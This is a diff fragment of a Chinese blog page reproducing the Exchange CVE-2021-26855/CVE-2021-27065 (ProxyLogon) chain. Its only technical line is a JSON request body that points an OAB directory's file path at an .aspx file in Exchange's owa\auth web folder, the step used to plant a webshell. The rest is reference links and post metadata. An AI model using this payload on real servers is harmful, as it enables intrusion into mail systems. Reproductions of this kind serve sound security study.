+{&quot;identity&quot;: {&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: &quot;977787fb-ece0-454e-9363-2cd8579ca39e&quot;}, &quot;properties&quot;: {&quot;Parameters&quot;: {&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\c1gfR60IjXo3CBSLuwtW.aspx&quot;}}}
+</code></pre><p><img src="https://www.mpimg.cn/image/Vnx3" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-zhong/p/14533053.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/14533053.html</a><br><a href="https://forum.butian.net/share/539" target="_blank" rel="noopener">https://forum.butian.net/share/539</a><br><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a><br><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd5ac72</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2356,12 +2054,12 @@ if (isset($_POST[&#39;submit&#39;])){
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>upload level 11 - level 16</p>
+    <p><span class="copy-title">文章标题:</span>Exchange (CVE-2021-26855和CVE-2021-27065)复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-13, 11:09:54</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-13, 12:44:08</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/470078a2.html" title="upload level 11 - level 16">http://422926799.github.io/posts/470078a2.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-23, 16:39:40</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-23, 17:25:43</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/a0e15799.html" title="Exchange (CVE-2021-26855和CVE-2021-27065)复现">http://422926799.github.io/posts/a0e15799.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
